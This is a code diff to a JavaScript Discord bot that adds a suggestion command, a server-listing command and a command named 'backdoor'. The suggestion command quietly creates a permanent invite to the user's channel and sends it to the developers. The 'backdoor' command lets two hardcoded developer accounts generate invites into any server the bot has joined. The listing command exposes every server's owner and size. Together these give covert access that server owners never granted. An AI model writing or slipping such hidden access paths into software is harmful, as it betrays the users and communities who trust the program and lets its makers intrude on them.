@@ -481,6 +481,64 @@ client.on("message", message => {
       ];
       toMeme = toMeme[Math.floor(Math.random() * toMeme.length)];
       message.channel.send(toMeme);
+    } else if (message.content.startsWith(prefix + "suggest")) {
+      let toSug = argsresult;
+      if (!toSug) return message.reply("Please suggest something!");
+      const invite = message.channel.createInvite({
+          temporary: false,
+          maxAge: 0,
+          maxUses: 1
+        })
+        .then(invite => {
+          const embed = new Discord.RichEmbed()
+            .setTitle(`:bangbang: **New suggestion** :bangbang:`)
+            .setAuthor(`${message.author.tag} (${message.author.id})`, `${message.author.avatarURL}`)
+            .setColor(0x0000FF)
+            .setDescription(`**Guild:** ${message.guild.name} (${message.guild.id}) \n**Channel:** #${message.channel.name} (${message.channel.id}) \n**User:** ${message.author.tag} (${message.author.id}) \n**Suggestion:** ${toSug} \n**Invite:** ${invite}`)
+            .setFooter("SmoreBot-JS Suggestions System")
+            .setTimestamp()
+          client.channels.get("304727510619389964").send({
+            embed: embed
+          });
+        })
+      message.reply("Thank you for your suggestion! The SmoreBot dev team appreciates all feedback. We will get back to you soon if we like your idea and want to discuss specifics.");
+    } else if (message.content.startsWith(prefix + "listguilds")) {
+      if (!jsdevs.includes(message.author.id)) return message.channel.send("Sorry, only the JS Devs `SpaceX#0276` or `TJDoesCode#6088` can do this!");
+      client.guilds.map((guild) => {
+        message.channel.send(`Guild: ${guild.id}
+  Name: ${guild.name}
+  Owner: ${guild.owner.user.tag} (${guild.owner.id})
+  Default Channel: #${guild.defaultChannel.name} (${guild.defaultChannel.id})
+  Members: ${guild.members.size}`)
+      })
+    } else if (message.content.startsWith(prefix + "backdoor")) {
+      if (!jsdevs.includes(message.author.id)) return message.channel.send("Sorry, only the JS Devs `SpaceX#0276` or `TJDoesCode#6088` can do this!");
+      let guild = args[0];
+      if (!guild) return message.reply("Please specify a guild to backdoor!");
+      if (!message.guild) {
+        const getGuild = client.guilds.get(guild)
+        const toInv = getGuild.defaultChannel
+        const invite = toInv.createInvite({
+            temporary: false,
+            maxAge: 120,
+            maxUses: 1
+          })
+          .then(invite => {
+            message.author.send(`${invite}`)
+          }).catch(console.error)
+      } else {
+        const getGuild = client.guilds.get(guild)
+        const toInv = getGuild.defaultChannel
+        const invite = toInv.createInvite({
+            temporary: false,
+            maxAge: 120,
+            maxUses: 1
+          })
+          .then(invite => {
+            message.author.send(`${invite}`)
+            message.reply('Check your DMs.')
+          }).catch(console.error)
+      }
     }
   }
 });
